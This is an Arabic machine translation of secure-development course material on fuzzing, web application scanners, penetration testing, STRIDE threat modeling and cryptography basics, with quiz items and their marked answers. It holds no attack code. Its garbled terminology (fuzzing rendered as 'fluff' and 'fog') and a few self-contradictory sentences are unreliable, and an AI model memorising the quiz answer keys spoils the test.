في اختبار الزغب ، تقوم بإنشاء عدد كبير من ** المدخلات العشوائية ، وتشغيل البرنامج ، ومعرفة ما إذا كان البرنامج يتصرف بشكل سيء (على سبيل المثال ، تعطل أو تعليق). أحد الجوانب الرئيسية للتشويش هو أنه ** لا يتحقق  بشكل عام مما إذا كان البرنامج ينتج الإجابة الصحيحة ؛ إنه يتحقق فقط من حدوث سلوك معقول معين (مثل "لا يتعطل").

غالبا ما يتطلب إنشاء اختبارات تقليدية الكثير من العمل ، ويرجع ذلك جزئيا إلى أنه يتعين عليك معرفة النتيجة الصحيحة. يعطي Fuzzing ذلك ، مما يسهل إرسال المزيد من المدخلات تلقائيا إلى البرنامج ولكن مع التخلي عن القدرة على اكتشاف أنواع معينة من الأخطاء. نظرا لأن أجهزة الكمبيوتر أصبحت أسرع وأرخص ، فقد أصبح التشويش مفيدا للغاية ، لأنه من الممكن تشغيل العديد من أجهزة الكمبيوتر لفترة طويلة من الزمن لتجربة العديد من المدخلات. يمكن أن يكون التشويش فعالا بشكل خاص في اكتشاف أخطاء سلامة الذاكرة (الشائعة والخطيرة) وفي إنشاء مدخلات غريبة تشدد على مدققي الإدخال. لا يحل Fuzzing محل الاختبار التقليدي ، ولكنه يمكن أن يكون مكملا ممتازا للاختبار التقليدي.

هناك العديد من الزغب ، وقد ركزت الكثير من الأبحاث على تحسينها. تاريخيا ، طبق الزغب مدخلات عشوائية حقا. يستخدم العديد من fuzzers اليوم الاستدلال و / أو نماذج البروتوكول و / أو معلومات أخرى لتوليد مدخلات البرنامج قيد الاختبار (SUT) المعروف أيضا باسم هدف التقييم (TOE) المعروف أيضا باسم الهدف. زادت بعض أجهزة الإزعاج أيضا من الطرق التي يمكنها من خلالها اكتشاف مشكلة ، وليس فقط عن طريق اكتشاف الأعطال. تزيد هذه التغييرات من احتمالية العثور على عيب (بما في ذلك الثغرة الأمنية).

#### استخدام الأزرار بشكل فعال

يمكن أن تكون Fuzzers مفيدة حقا للعثور على نقاط الضعف. إذا كنت تستخدم واحدا ، فغالبا ما يكون من الحكمة إضافة تأكيدات البرنامج وتمكينها. هذا يحول مشاكل الحالة الداخلية - التي قد لا يكتشفها الزغب - إلى تحطم ، يمكن للزغب اكتشافه بسهولة. إذا كنت تقوم بتشغيل برنامج C / C ++ ، فيجب أن تفكر في تشغيل fuzzer مع معقم العنوان (ASAN) - ستحول ASAN بعض مشكلات الوصول إلى الذاكرة التي تحدث عادة بهدوء إلى تعطل ، ومرة أخرى ، يعمل هذا التحول على تحسين قدرة fuzzer على اكتشاف المشكلات.

يستخدم كل من متصفحات الويب Firefox و Chromium fuzzers ، جنبا إلى جنب مع ASAN ، لمحاولة اكتشاف نقاط الضعف قبل إصدار إصدارات جديدة.

إذا كان برنامجك يقوم بإجراء فحوصات على المدخلات مثل فحص المجاميع الاختبارية أو رؤوس CRC (فحص التكرار الدوري) ، فربما تحتاج قريبا إلى تعطيل هذه الفحوصات أو إعادة تنفيذ هذه القيم بشكل خاص عند استخدام fuzzer. بكل الوسائل ، استخدم fuzzer على البرنامج غير المعدل أولا ، ولكن المشكلة تكمن في أن fuzzer سينتهي به الأمر في المقام الأول إلى اختبار رمز التحقق من رأس المجموع الاختباري / CRC مرارا وتكرارا ، وليس بقية الكود. تم تصميم بعض أجهزة fuzzer لإنشاء مدخلات جيدة التنسيق من شأنها اجتياز عمليات التحقق مثل CRC ثم محاولة العثور على أخطاء أعمق في البرنامج قيد الاختبار.

تعتمد العديد من fuzzers *على الطفرة* - أي أنها تبدأ بمجموعة بداية من مدخلات العينة (تسمى "البذور") ، ثم تقوم بتحويل المدخلات السابقة بشكل متكرر لإنشاء مدخلات اختبار جديدة. تعتمد فعالية الزغابات القائمة على الطفرات بشكل كبير على البذور المختارة. تتمثل القاعدة الأساسية المفيدة لإنشاء البذور في محاولة تحديد الحد الأدنى من مجموعة المدخلات اللازمة لتغطية (أو تغطية تقريبا) الكود (أي لتحقيق تغطية بيان بنسبة 100٪). لمعرفة المزيد، راجع [*تحسين اختيار البذور للتشويز،*](https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-rebert.pdf) 2014. إذا كان هذا عددا كبيرا جدا من البذور ، فحدد البذور لتغطية أكبر قدر ممكن من الكود بهذا العدد من البذور (لذلك ستكون كل بذرة مختلفة بشكل كبير).

#### الزينة الموجهة بالتغطية

فئة فرعية مهمة من الزغب هي زغب *موجه بالتغطية*. تقوم هذه الشفرات بأداة البرنامج قيد الاختبار (SUT ، البرنامج الذي يتم اختباره) بحيث يحصل fuzzer على معلومات حول الكود الذي يتم تغطيته عند تنفيذ كل إدخال (بما في ذلك ، في كثير من الحالات ، عدد المرات التي يتم فيها تنفيذ أجزاء مختلفة من الكود). ثم يتم استخدام هذه المعلومات لتحديد المدخلات التالية التي سيتم إنشاؤها. أظهرت الأداة American Fuzzy Lop (AFL) قوة هذه التقنية. لا يستخدم فقط أجزاء الكود التي يتم تنفيذها ، ولكن عدد المرات ، ويفضل إنشاء مدخلات جديدة مشابهة للمدخلات السابقة التي تسببت في أعداد جديدة. تستخدم أدوات أخرى مثل libFuzzer هذا النهج أيضا. تسمى هذه الزويات أيضا  ب *fuzzers المستندة إلى التغذية الراجعة* أو  أداة *اختبار أمان التطبيقات المستندة إلى التعليقات* (FAST  ) ([*ما هو FAST؟*](https://blog.code-intelligence.com/what-is-fast) ، بقلم سيرجي ديشاند ، 2020). يجمع هذا النهج بين التحليل الثابت والديناميكي ، لذلك يمكن اعتبار هذه الأدوات أدوات تحليل مختلطة.

#### تناقص معدل العائد

التحدي مع fuzzers هو أنه مع مرور الوقت لديهم عموما معدل عائد متناقص. أي أنهم غالبا ما ينجحون في العثور على نقاط الضعف في البرامج التي لم يتم تشويشها من قبل ، ولكن قد يستغرق الأمر وقتا هائلا (أو لا يستغرق أبدا) للعثور على الثغرة الأمنية التالية بمجرد إصلاح المشكلات المكتشفة مسبقا. يمكن أن تتطلب أيضا موارد. قد يستغرق التشويش أياما أو أسابيع أو حتى وقتا أطول من التنفيذ المستمر على عدد من الأنظمة المتوازية قبل أن يتمكن الضباب من العثور على شيء ما. هذا لا يعني أن الزغب عديم الفائدة - يمكن أن يكون مفيدا جدا - ولكن مرة أخرى ، فهي ليست سوى جزء من مجموعة أدوات لجعل البرامج آمنة.

#### مشاريع غامضة

إذا كنت تدير مشروع برمجيات المصدر المفتوح، يمكنك التفكير في المشاركة في مشروع [OSS-Fuzz من Google](https://github.com/google/oss-fuzz). يطبق OSS-Fuzz التشويش مع العديد من المطهرات لمحاولة اكتشاف نقاط الضعف. [يشجع مشروع Fuzzing](https://fuzzing-project.org/) / ينسق تطبيق اختبار الزغب على برمجيات المصدر المفتوح.

#### الماسحات الضوئية للتطبيقات الغامضة وتطبيقات الويب

هناك عدد كبير من fuzzers ، والأمور تتغير طوال الوقت. الخطوة الأولى هي معرفة أن هناك أداة قد تكون مفيدة. ومع ذلك ، إذا كان ما قمت بتطويره هو تطبيق ويب ، فهناك أداة مصممة خصيصا لهذا الموقف تقوم عادة بتضمين fuzzer بداخله ، تسمى *ماسح تطبيقات الويب*. سنناقش ذلك في الوحدة التالية.

#### اختبار 1.5: اختبار الزغب

\>\>حدد العبارة (العبارات) الحقيقية حول التشويش:<<

[!] ترسل Fuzzers المدخلات إلى البرنامج وتحدد ما إذا كان الإخراج صحيحا أم لا.

[x] يستخدم fuzzer الموجه بالتغطية أو المستند إلى التعليقات معلومات حول التعليمات البرمجية التي تغطيها عمليات تنفيذ الإدخال السابقة لتحديد المدخلات التي سيتم إنشاؤها بعد ذلك.

[x] عند تشويش مكون مكتوب بلغة C أو C ++ ، قد يكون من المفيد تمكين المطهرات مثل معقم العنوان (ASAN) لتحويل مشاكل الحالة الداخلية إلى عطل يمكن للزغب اكتشافه.

[x] يتطلب التشويش عادة خطوات إضافية لتطبيقها على التعليمات البرمجية التي تعالج المدخلات من خلال التحقق من صحة المجموع الاختباري.

[ ] عادة ، يجد الضبابية نقاط ضعف جديدة كحالة مستقرة بمرور الوقت. {{ محدد: لا، عادة ما يكون هناك معدل عائد متناقص. }}

### الماسحات الضوئية لتطبيقات الويب

[تطبيق ويب]

اليوم يقوم العديد من الأشخاص بتطوير تطبيقات الويب ، وتطبيقات الويب لها العديد من الواجهات القياسية. نتيجة لذلك ، هناك برامج مصممة خصيصا لتحليل تطبيقات الويب ديناميكيا للبحث عن نقاط الضعف.

يتظاهر ماسح تطبيقات الويب (WAS) ، الذي يطلق عليه أيضا ماسح ثغرات تطبيق الويب ، بشكل أساسي بأنه مستخدم محاكاة أو متصفح ويب ويحاول القيام بالعديد من الأشياء لاكتشاف المشكلات. فكر في WAS كمستخدم متصفح ويب محموم وضار ؛ سيحاول WAS النقر فوق كل زر يعثر عليه ، وإدخال نص غريب في كل حقل نصي يعثر عليه ، وما إلى ذلك. باختصار ، يحاول محاكاة الهجمات والسلوك الغريب لمحاولة اكتشاف المشكلات. هذا يعني أن WASs غالبا ما تعتمد على fuzzers داخليا ، ولكنها مصممة خصيصا لتحليل تطبيقات الويب.

تتمثل إحدى المشكلات الرئيسية في WAS في متجهات الإدخال التي يمكنها اختبارها. يمكن لبعض WASs إنشاء عناوين URL جديدة فقط ولا يمكنها اختبار تطبيقات JavaScript من جانب العميل. مثل هذه البرامج ليست مفيدة لاختبار البرامج باستخدام JavaScript من جانب العميل.

تختلف WASs أيضا في كيفية اكتشاف المشكلات المتعلقة بالنتائج. مما لا يثير الدهشة ، سيتم الإبلاغ عن تعطل تطبيق الويب كمشكلة. تميل WASs أيضا إلى إجراء * مجموعة متنوعة من * عمليات التحقق السلبية (على سبيل المثال ، للتحقق من سمات ملفات تعريف الارتباط التي تم إرجاعها) لمحاولة اكتشاف مجموعة متنوعة من المشكلات.

مثل العديد من الأدوات الأخرى ، تعمل WASs بشكل إرشادي ولديها عموما مجموعة متنوعة من القواعد. نتيجة لذلك ، قد تكتشف WASs المختلفة (ولا تكتشف) أشياء مختلفة.

ستحتاج إلى استخدام WAS في بيئة اختبار ، وليس بيئة إنتاج حقيقية ، لأنها ستحاول *عمدا* التسبب في مشاكل. قد ترغب في البدء بمجرد تشغيل WAS كما هو ، ولكنك ستحتاج قريبا إلى إنشاء حساب مزيف وإعطاء WAS معلومات الحساب المزيفة. خلاف ذلك ، إذا تم إنشاء نظام تسجيل الدخول الخاص بك بشكل صحيح ، فلن يتمكن WAS إلا من اختبار نقاط الضعف لشخص ليس لديه بيانات اعتماد تسجيل دخول صالحة.

هناك العديد من هذه الأدوات. تشمل أدوات OSS OWASP ZAP و W3AF و IronWASP و Skipfish و Wapiti. تتضمن الأدوات الخاصة IBM AppScan و HP WebInspect و Burp Suite Pro. إذا لم تكن لديك فكرة ، فيمكنك التحقق من OWASP ZAP على الأقل ؛ إنه سهل الاستخدام ، ويمكنه العثور على أشياء كثيرة. لكن الأدوات تتغير بمرور الوقت ، ومن الأفضل إلقاء نظرة على خياراتك قبل اختيار واحد (أو عدة).

إذا كنت تقوم بتطوير تطبيق ويب ، فمن الجيد استخدام ماسح ضوئي واحد على الأقل لتطبيق الويب. لن تجد هذه الأدوات جميع المشاكل المحتملة ، ومثل fuzzers ، فإنها تميل إلى العثور على مشاكل أقل بمرور الوقت. ولكن لا يزال من الممكن أن تكون مفيدة.

غالبا ما ينظر إلى مصطلح اختبار أمان التطبيق الديناميكي ، أو DAST ، في الأدبيات. ومع ذلك ، فإن *معنى* DAST لديه الكثير من الاختلاف:

* بالنسبة للبعض ، DAST هو تحليل ديناميكي للعثور على نقاط الضعف في تطبيقات الويب (انظر VeraCode [* ، DAST TEST: فوائد اختبار DAST لأمن التطبيقات ، *](https://www.veracode.com/security/dast-test)2020) ، مما يجعل المصطلح مكافئا في الغالب لماسحات *تطبيقات الويب*. John Breeden II ([*أفضل 9 أدوات تشويش: العثور على أغرب أخطاء التطبيق*](https://www.csoonline.com/article/3487708/9-top-fuzzing-tools-finding-the-weirdest-application-errors.html) ، 2019) ينص على ذلك ويميز صراحة DAST عن fuzzing.

* يعرف توماس سكانلون ([*10 أنواع من أدوات اختبار أمان التطبيقات: متى وكيف يتم استخدامها*](https://insights.sei.cmu.edu/sei_blog/2018/07/10-types-of-application-security-testing-tools-when-and-how-to-use-them.html) ، 2018) DAST كأدوات للعثور على الثغرات الأمنية حيث  "*ليس لدى المختبر معرفة مسبقة بالنظام" * وأن *"أدوات DAST تستخدم التشويش*". مع هذا التعريف ، تعد الماسحات الضوئية لتطبيقات الويب و fuzzers أدوات DAST. وبالمثل ، سيرجي ديشاند ([*ما هو FAST؟ *](https://blog.code-intelligence.com/what-is-fast)، 2020) الماسحات الضوئية لتطبيقات الويب و fuzzers تحت عنوان "DAST".

في هذه الدورة ، استخدمنا عمدا مصطلحات أكثر تحديدا بدلا من DAST ، على أمل جعل الأمور أكثر وضوحا. النقطة المهمة ، بغض النظر عن المصطلحات ، هي استخدام الأساليب (بما في ذلك الأدوات) للعثور على نقاط الضعف وإصلاحها قبل أن يستغلها المهاجمون.

#### اختبار 1.6: الماسحات الضوئية لتطبيق الويب

\>\>يتم تنفيذ ماسح ضوئي لتطبيق الويب (WAS) في وقت التشغيل; يرسل البيانات بشكل متكرر إلى تطبيق ويب في محاولة لتشغيل المشكلات ثم اكتشافها. صواب أم خطأ؟<<

(x) صحيح

( ) خطأ

## مواضيع التحقق الأخرى

### الجمع بين نهج التحقق

هناك العديد من الأنواع الأخرى من نهج التحقق ، والعديد من الطرق للجمع بينها.

 *يحاكي اختبار الاختراق (*المعروف أيضا باسم *اختبار القلم*) هجوما على نظام لمحاولة اقتحام (*اختراق*) النظام. يطلق على الأشخاص الذين يقومون باختبار الاختراق اسم مختبري الاختراق أو الفريق الأحمر. قد يتم مواجهتهم بنشاط من قبل فريق دفاعي (يسمى أيضا الفريق الأزرق). الهدف من اختبار الاختراق هو التعرف على نقاط الضعف حتى يمكن تقويتها *قبل* أن  يحاول مهاجم حقيقي مهاجمة النظام.

يقوم *تدقيق الأمان* بمراجعة النظام للبحث عن الثغرات الأمنية. غالبا ما يتم استخدام العبارة التي تنطوي على نهج أكثر منهجية ، حيث تتم مراجعة التصميمات والتعليمات البرمجية للبحث عن المشاكل. ولكن هذا ليس صحيحا دائما؛ بل هو الصحيح دائما. تستخدم مصطلحات *التدقيق الأمني* *واختبار الاختراق* أحيانا بشكل مترادف. بغض النظر عن ذلك ، غالبا ما تستخدم عمليات التدقيق الأمني واختبارات الاختراق مجموعة متنوعة من التقنيات ، بما في ذلك التحليل الثابت والديناميكي ، لمحاولة العثور على نقاط الضعف قبل أن يتمكن المهاجمون الحقيقيون من العثور عليها واستغلالها.

تحدد شارة أفضل الممارسات لمؤسسة أمان المصدر المفتوح (OpenSSF) مجموعة من أفضل الممارسات لمشاريع البرمجيات مفتوحة المصدر (OSS). هناك ثلاثة مستويات شارة: التمرير والفضة والذهب. يتطلب كل مستوى تلبية المستوى السابق ؛ الذهب صعب بشكل خاص *ويتطلب* العديد من المطورين. ويوجد داخل كل مستوى مجموعة من المعايير التي تعتبر أفضل الممارسات لتطوير برمجيات المصدر المفتوح الآمنة والمستدامة، ولكل معيار محدد هوية قصير. فيما يلي بعض الأمثلة على معاييرها:

* "*يجب أن يستخدم المشروع **مجموعة اختبار تلقائية واحدة على الأقل يتم إصدارها علنا ك FLOSS ** (يمكن الاحتفاظ بمجموعة الاختبار هذه كمشروع FLOSS منفصل)." * [اختبر] لاحظ أن هذا المعيار يتعلق فقط بمجموعة اختبار مؤتمتة تقليدية (على سبيل المثال ، لوظائفها).

* *"يجب تطبيق أداة تحليل كود ثابتة واحدة على الأقل على أي إصدار إنتاج رئيسي مقترح للبرنامج قبل إصداره ، إذا كانت هناك أداة FLOSS واحدة على الأقل تنفذ هذا المعيار باللغة المحددة." * [static_analysis]

* *"يجب أن تدعم مواقع المشروع (موقع الويب والمستودع وعناوين URL للتنزيل) HTTPS باستخدام TLS." * [sites_https]

إذا كنت تستخدم OSS ، ففكر في تفضيل OSS الذين حصلوا على شارة. إذا كنت تقوم بتطوير برمجيات المصدر المفتوح، فيجب أن تفكر بشدة في العمل للحصول على شارة أفضل الممارسات لمؤسسة أمان المصدر المفتوح (OpenSSF). من خلال تنفيذ أفضل الممارسات هذه ، ستزيد من احتمالية تطوير برامج عالية الجودة وأكثر أمانا. لمعرفة المزيد والبدء، تحقق من [برنامج شارة أفضل ممارسات OpenSSF](https://bestpractices.coreinfrastructure.org/en).

#### الاختبار 1.7: الجمع بين نهج التحقق

\>\>حدد العبارة (العبارات) الحقيقية:<<

[!x] يحاكي اختبار القلم هجوما على نظام ، في محاولة لاقتحامه.

[x] يبحث التدقيق الأمني عن نقاط الضعف من خلال مراجعة المعلومات حول النظام ، وغالبا ما يتضمن نهجا منهجيا.

[x] شارة OpenSSF Best Practices هي مجموعة من المعايير لمشاريع البرمجيات مفتوحة المصدر.

[ ] لا شيء مما سبق

# نمذجة التهديدات

يصف هذا الفصل أساسيات نمذجة التهديد جنبا إلى جنب مع نهج نمذجة تهديد محدد يسمى STRIDE.

أهداف التعلم:

1. ناقش أساسيات نمذجة التهديدات.

2. اشرح ما هو STRIDE وتطبيقه الأساسي.

## نمذجة التهديد / نمذجة الهجوم

### مقدمة في نمذجة التهديدات

خدعة مفيدة لإنشاء أنظمة آمنة هي *التفكير كمهاجم* قبل كتابة التعليمات البرمجية أو التغيير إلى الكود.

نمذجة التهديد هي عملية فحص متطلباتك وتصميمك للنظر في كيفية استغلال المهاجم لنظامك أو اقتحامه ، بحيث يمكنك محاولة منع هذه المشكلات في المقام الأول. لأغراضنا ، سننظر في مصطلح *نمذجة الهجوم* كمرادف *لنمذجة التهديد* ، على الرغم من أن البعض يستخدم المصطلحات لتعني أشياء مختلفة. تختلف مصطلحات الصناعة كثيرا هنا ، ونريد التركيز على ما هو مفيد للقيام به ، وليس ما نسميه. من الأشياء الرائعة في نمذجة التهديد / نمذجة الهجوم أنه يمكنك القيام بذلك *قبل* تحديد التصميم أو كتابة التعليمات البرمجية ، حتى يتمكنوا من مساعدتك مبكرا جدا عند تطوير نظام جديد.

إذا لم يكن هناك خطر أمني ذي مغزى ، فمن المحتمل أن تكون نمذجة التهديد غير مبررة. ربما لا تستحق نمذجة التهديد كل هذا العناء إذا كنت تكتب مكونا صغيرا داخل نظام لا يركز على الأمان (مثل حزمة JavaScript أحادية الوظيفة للقيام بمعالجة نصية بسيطة). تركز نمذجة التهديد بشكل عام على الأنظمة الأكبر حيث توجد حدود ثقة واضحة. ولكن إذا كان هناك خطر أمني ذي مغزى ، وكنت تبني شيئا أكبر ، فإن التفكير بعناية في الأشياء من وجهة نظر المهاجم يمكن أن يكون مفيدا للغاية.

هناك العديد من الطرق المختلفة للقيام بنمذجة التهديد. على سبيل المثال ، من أين تبدأ؟ قد تؤكد الأساليب المختلفة على البدء بما يلي:

1. المهاجم (ما هي أهداف المهاجم؟ القدرات؟ طريقة القيام بالأشياء؟)

2. الأصول المراد حمايتها

3. تصميم النظام.

يجب أن تفكر قليلا على الأقل في كل منهم ، لكن من المفيد أن يكون لديك مكان للبدء. سيبدأ العديد من خبراء الأمن بالمهاجم أو الأصول. ومع ذلك ، بالنسبة للعديد من المطورين ، غالبا ما يكون من الأسهل البدء بالتصميم. لا يعرف العديد من المطورين كيف يعمل المهاجمون بعمق ، وتواجه العديد من المؤسسات قدرا مدهشا من المتاعب في معرفة الأصول الأكثر أهمية. في المقابل ، إذا قمت بتطوير برنامج على الإطلاق ، فيجب ** أن تكون قادرا على تقسيم المشكلة ، لذلك بالنسبة لمعظم المطورين ، يبدأ التركيز على التصميم بقوة طبيعية. يجب ألا *تتجاهل* من هو المهاجم ، أو ما هي الأصول التي تحتاج إلى حماية ؛ إنها مجرد مسألة تركيز.

المشكلة ذات الصلة هي كيفية القيام بهذا النوع من التحليل. بعض الناس إنشاء مجموعة من *الأشجار الهجوم*. تحدد كل شجرة حدثا يحاول المهاجم التسبب فيه ، وتعمل بشكل عكسي لإظهار كيف يمكن أن يحدث الحدث (نأمل أن تظهر أنه لا يمكن أن يحدث أو أنه غير مرجح للغاية). يمكن أن يعمل هذا النهج بشكل جيد ، ولكن في الممارسة العملية ، يتطلب خبرة في أساليب الهجوم ؛ هذه خبرة يمتلكها عدد قليل من المطورين. تركز بعض الأساليب على تحليل المؤسسة ، ولكن إذا كان سيتم استخدام برنامجك في العديد من المؤسسات المختلفة ، فإن هذا لا يعمل بشكل جيد.

لأغراضنا ، سنركز في الوحدة التالية على نهج بسيط للغاية يسمى STRIDE.

#### اختبار 2.1: مقدمة في نمذجة التهديدات

\>\>حدد العبارة (العبارات) الحقيقية:<<

[!x] لأغراض هذه الدورة ، نمذجة التهديد / نمذجة الهجوم هي عملية فحص متطلباتك وتصميمك للنظر في كيفية استغلال المهاجم لنظامك أو اقتحامه ، بحيث يمكنك محاولة منع هذه المشكلات في المقام الأول.

[x] قد يجد العديد من المطورين أنه من الأسهل التركيز على تصميم النظام بدلا من أساليب المهاجم أو الأصول التي تحتاج إلى الحماية.

[ ] يجب عليك دائما القيام بنمذجة التهديد / نمذجة الهجوم {{ المحدد: ربما لا يستحق هذا العناء بالنسبة للمكونات الصغيرة و / أو المكونات التي ليس لها مخاوف أمنية كبيرة. نرحب بك للقيام بذلك ، ولكن قد تجد جهودك تنفق بشكل أفضل في مكان آخر. }}

### خطوه

النهج السهل الذي يركز على التصميم هو النهج الذي طورته Microsoft يسمى STRIDE. سنغطي STRIDE هنا ، لأنه من الأفضل معرفة نهج واحد بسيط يساعد بدلا من نظام معقد قد يكون من الصعب جدا استخدامه. في الأدبيات يسمى هذا الإصدار *STRIDE-by-element*. راجع نموذج روبرت ريتشل [*كيف نهدد*](https://github.blog/2020-09-02-how-we-threat-model/) (2020) لمناقشة كيفية استخدام GitHub ل STRIDE.

توصي Microsoft بتنفيذ الخطوات التالية لأي نهج نمذجة التهديد (نمذجة الهجوم) (نمذجة [المخاطر من Microsoft](https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling)):

1. تحديد متطلبات الأمان.

2. إنشاء رسم تخطيطي للتطبيق.

3. تحديد التهديدات.

4. تخفيف التهديدات.

5. تحقق من تخفيف حدة التهديدات.

عند تطبيق STRIDE في الخطوة 2 ، تحتاج إلى إنشاء تمثيل بسيط لتصميمك. عادة ، يتم ذلك عن طريق إنشاء مخطط بسيط لتدفق البيانات (DFD) (لمزيد من التفاصيل ، راجع [*نمذجة التهديد: 12 طريقة متاحة ، *](https://insights.sei.cmu.edu/sei_blog/2018/12/threat-modeling-12-available-methods.html)بقلم ناتاليا شيفتشينكو ، 2018):

1. يتم تمثيل عمليات البيانات بدوائر

2. يتم تمثيل مخازن البيانات بأسطر أعلى وأسفل أسمائها (قد تراها أيضا كأسطوانات)

3. يتم تمثيل تدفقات البيانات بخطوط موجهة ؛ وتشمل هذه تدفقات البيانات عبر الشبكة

4. عادة ما تحتوي المتفاعلات (العناصر الموجودة خارج نظامك وتتفاعل معه) على أيقونات بسيطة ، مثل شكل عصا للإنسان

5. يتم تمثيل حدود الثقة بخط متقطع. هذه تمثل الحدود بين الأجزاء الموثوقة وغير الموثوق بها.

العناصر هي كل شيء ما عدا حدود الثقة. أي أن العمليات ومخازن البيانات وتدفقات البيانات والمتفاعلات كلها عناصر.

الفكرة هي أن يكون لديك نموذج بسيط للتصميم يوضح الميزات الأساسية. فيما يلي بعض القواعد الأساسية السريعة للتمثيل الجيد:

* يجب أن يحتوي كل مخزن بيانات على إدخال واحد على الأقل وإخراج واحد على الأقل ("لا توجد بيانات تخرج من فراغ").

* يعالج فقط قراءة أو كتابة البيانات في مخازن البيانات ("لا يوجد حركية نفسية")

* يمكن طي العناصر المتشابهة في حدود ثقة واحدة في عنصر واحد ("اجعل النموذج بسيطا").

بعد ذلك ، عند تطبيق STRIDE في الخطوة 3 ، تقوم بفحص كل عنصر من العناصر (العمليات ومخازن البيانات وتدفقات البيانات والتفاعلات) لتحديد التهديدات التي تكون عرضة لها. لكل عنصر ، تبحث عن التهديدات كما هو موضح في هذا الجدول:

![نص بديل للصورة](stride_threat_categories.png)

**فئات تهديدات STRIDE ، **تم استردادها  من [SEI](https://insights.sei.cmu.edu/sei_blog/2018/12/threat-modeling-12-available-methods.html) ، في الأصل من Microsoft

لاحظ أن "STRIDE" هو ببساطة اختصار للتهديدات التي يتم النظر فيها: الانتحال ، والعبث ، والتنصل ، والكشف عن المعلومات ، والحرمان من الخدمة ، ورفع الامتياز.

STRIDE هي واحدة من أقدم وأشهر وأبسط أشكال نمذجة التهديد (نمذجة [*التهديد: كشف عيوب تصميم الأمان باستخدام نهج STRIDE*](https://web.archive.org/web/20070303103639/http://msdn.microsoft.com/msdnmag/issues/06/11/ThreatModeling/default.aspx) ، بقلم شون هيرنان وسكوت لامبرت وتوماس أوستوالد وآدم شوستاك ، 2006). هناك أدوات يمكنك استخدامها مصممة لدعم STRIDE ؛ يمكنك أيضا استخدام STRIDE مع الأدوات الأساسية مثل أداة الرسم و / أو معالج النصوص و / أو جدول البيانات.

كما أشرنا سابقا ، هناك طرق أخرى. لا تتردد في تعلمها أو استخدامها بدلا من ذلك إذا كانت تساعدك. حتى أن معهد هندسة البرمجيات (SEI) كتب بعض التحليلات للنهج المختلفة ، بما في ذلك إيجابياتها وسلبياتها ([شيفتشينكو ، 2018](https://insights.sei.cmu.edu/sei_blog/2018/12/threat-modeling-12-available-methods.html)). كتبت Microsoft أيضا بعض المواد حول [نمذجة التهديدات](https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling).

قد تكون نمذجة التهديد مبالغة إذا لم يكن لديك تهديدات أمنية كبيرة ، ولا تضمن نمذجة التهديد أنك ستجد جميع المشكلات. ومع ذلك ، إذا كانت لديك تهديدات أمنية كبيرة ، فإن نمذجة التهديدات باستخدام مناهج مثل STRIDE يمكن أن توفر طريقة بسيطة نسبيا للتفكير في الأسئلة الرئيسية قبل استثمار الكثير من الوقت.

 يعتبر الفشل في تطبيق نمذجة التهديد جزءا من 2021 OWASP Top 10 # 4 ، التصميم غير الآمن.

#### اختبار 2.2: خطوة

\>\>حدد العبارة (العبارات) الحقيقية:<<

[!x] يستخدم STRIDE تمثيلا مبسطا للتصميم ، وعادة ما يكون مخططا لتدفق البيانات.

[x] بالنسبة إلى STRIDE ، عادة ما يتم طي العناصر المماثلة في التصميم في عنصر واحد طالما أنها لا تعبر حدود الثقة.

[ ] الهدف من STRIDE هو فحص كل عنصر تصميم لمعرفة ما إذا كان هناك تهديد بالكشف عن المعلومات أو العبث بالبيانات. {{ محدد: لا، هذا جزء فقط من القصة. نعم ، يجب أن تفكر في الكشف عن المعلومات (انتهاك السرية) والعبث بالبيانات (انتهاك النزاهة). لكن هذه ليست سوى "I" و "T" من STRIDE. يجب عليك أيضا التفكير في انتحال الهوية والتنصل والحرمان من الخدمة ورفع الامتياز. }}

# التشفير

يصف هذا الفصل أساسيات كيفية استخدام التشفير للمساعدة في تطوير برامج آمنة، بما في ذلك أساسيات خوارزميات تشفير المفاتيح المتماثلة/المشتركة، وتجزئات التشفير، وتشفير المفتاح العام (غير المتماثل)، وكيفية تخزين كلمات المرور بشكل آمن، ومولدات الأرقام العشوائية الزائفة الآمنة بشكل مشفر (CSPRNG)، وأمان طبقة النقل (TLS).

أهداف التعلم:

1. فهم ما هو التشفير.

2. ناقش أساسيات خوارزميات تشفير المفاتيح المتماثلة / المشتركة.

3. ناقش أساسيات تجزئات التشفير.

4. ناقش أساسيات تشفير المفتاح العام (غير المتماثل).

5. اشرح كيفية * تخزين كلمات المرور* بشكل آمن.

6. ناقش أساسيات مولدات الأرقام العشوائية الزائفة المشفرة (PRNG).

7. فهم أساسيات استخدام أمان طبقة النقل (TLS).

8. فهم أساسيات موضوعات التشفير الرئيسية الأخرى.

## تطبيق التشفير

### مقدمة في التشفير

تأتي كلمة *التشفير* من العبارة اليونانية التي تعني "الكتابة السرية". التشفير هو علم أو فن تحويل شكل واضح ، وعكسه. ومع ذلك ، يهاجم العديد من الأشخاص أنظمة التشفير. تحليل الشفرات هو علم أو فن التراجع عن تحويل التشفير دون معرفة دقيقة بكيفية القيام به.

يوفر التشفير مجموعة من الأدوات التي يمكن أن تساعد في بعض الأحيان في تطوير برامج آمنة. *لا يمكن* للتشفير  حل جميع مشاكل الأمان. في الواقع ، لا علاقة لمعظم الثغرات الأمنية في الكمبيوتر بالتشفير.

![نص بديل للصورة](xkcd_security.png)

**الأمان ، **تم استرداده من [xkcd](https://xkcd.com/538/) ، مرخص بموجب [CC-BY-NC-2.5](https://creativecommons.org/licenses/by-nc/2.5/)

ومع ذلك ، في *بعض* الأنظمة ، يعد التشفير جزءا مهما للغاية من جعل النظام آمنا. غالبا ما يستخدم التشفير لحماية سرية البيانات الحساسة ، ويمكنه القيام بذلك بطريقتين:  في *حالة عدم النشاط* (تخزين المعلومات في شكل مشفر) وأثناء النقل* (نقل المعلومات في شكل مشفر * ). يمكن للتشفير أيضا ، مع حدود معينة ، التحقق من أن المعلومات من شخص لديه مفتاح مطابق ، و / أو التحقق من عدم تغيير بيانات معينة.

يعد الفشل في استخدام التشفير عند استخدامه ، في حد ذاته ، ثغرة أمنية. غالبا ما تسمى المعلومات غير المشفرة "نص واضح" أو "نص عادي".  في العديد من الشبكات (بما في ذلك الإنترنت ومجموعتها الفرعية شبكة الويب العالمية) ، بالإضافة إلى العديد من أنظمة التخزين (مثل النسخ الاحتياطية) ، يمكن اعتراض النص العادي وتعديله من قبل أطراف غير مصرح لها.

